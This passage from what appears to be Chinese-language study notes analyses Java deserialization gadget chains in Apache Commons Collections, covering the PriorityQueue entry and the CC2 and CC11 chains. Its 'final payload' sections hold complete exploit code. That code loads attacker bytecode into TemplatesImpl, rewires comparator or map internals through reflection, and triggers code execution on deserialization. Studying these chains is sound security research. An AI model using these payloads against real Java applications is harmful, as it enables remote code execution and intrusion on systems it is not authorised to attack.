看哪里又调用了siftDown方法

![](./img/5995239108178484481.png)  
在heapify方法又调用了siftDown方法。恰好在readobject方法调用了heapify方法。

![](./img/4650677921435447756.png)  
来到readobject方法

![](./img/3843742138423685564.png)  
其实还是换汤不换药

那我们入口是不是可以构造为：

    
    
    TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
    
    PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
    
    serialize(priorityQueue);
    unserialize("ser.bin");
    

但是我们发现他并没有执行代码  
![](./img/1667393697139093095.png)  
进行调试断点在PriorityQueue类的readobject中下。我们发现在执行heapify方法的时候，我们的size右移3位是为0的但是如果是2的话，那么我们右移3位就是1了。

![](./img/4548497081092462843.png)  
所以我们需要给priorityQueue添加两个元素。这样就可以成功执行了

![](./img/3285601981177476535.png)

##### 小总结

其实我们发现前半段使用的优先队列的类 后半部分还是使用的是cc3中的链。还是换汤不换药。

#### CC2链

##### 最终payload

    
    
    TemplatesImpl templates = new TemplatesImpl();
            Class tc = templates.getClass();
            Field name = tc.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(templates,"aaaaaa");
            Field bytecodes = tc.getDeclaredField("_bytecodes");
            bytecodes.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"));
            byte[][] codes = {code};
            bytecodes.set(templates,codes);
    
    //        Field tfactory = tc.getDeclaredField("_tfactory");
    //        tfactory.setAccessible(true);
    //        tfactory.set(templates,new TransformerFactoryImpl());
    
    
            InvokerTransformer newTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
            TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
    
            PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
            priorityQueue.add(templates);
    
            Class c = transformingComparator.getClass();
            Field transformer = c.getDeclaredField("transformer");
            transformer.setAccessible(true);
            transformer.set(transformingComparator,newTransformer);
    
            serialize(priorityQueue);
            unserialize("ser.bin");
    

##### 流程分析

其实也是换汤不换药就是拿前两个cc的前部分和后半部分进行拼接的。

#### CC11链

##### 最终payload

    
    
    TemplatesImpl templates = new TemplatesImpl();
    Class tc = templates.getClass();
    Field name = tc.getDeclaredField("_name");
    name.setAccessible(true);
    name.set(templates,"aaaaaa");
    Field bytecodes = tc.getDeclaredField("_bytecodes");
    bytecodes.setAccessible(true);
    byte[] code = Files.readAllBytes(Paths.get("/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"));
    byte[][] codes = {code};
    bytecodes.set(templates,codes);
    
    
    
    
    InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
    HashMap innermap = new HashMap();
    LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
    TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
    
    
    HashSet hashset = new HashSet(1);
    hashset.add("foo");
    Field f = null;
    try {
        f = HashSet.class.getDeclaredField("map");
    } catch (NoSuchFieldException e) {
        f = HashSet.class.getDeclaredField("backingMap");
    }
    f.setAccessible(true);
    HashMap hashset_map = (HashMap) f.get(hashset);
    
    Field f2 = null;
    try {
        f2 = HashMap.class.getDeclaredField("table");
    } catch (NoSuchFieldException e) {
        f2 = HashMap.class.getDeclaredField("elementData");
    }
    
    f2.setAccessible(true);
    Object[] array = (Object[])f2.get(hashset_map);
    
    Object node = array[0];
    if(node == null){
        node = array[1];
    }
    Field keyField = null;
    try{
        keyField = node.getClass().getDeclaredField("key");
    }catch(Exception e){
        keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
    }
    keyField.setAccessible(true);
    keyField.set(node,tiedmap);
    
    Field f3 = transformer.getClass().getDeclaredField("iMethodName");
    f3.setAccessible(true);
    f3.set(transformer,"newTransformer");
    
    serialize(hashset);
    unserialize("ser.bin");
    

![](./img/2429444761092025082.png)

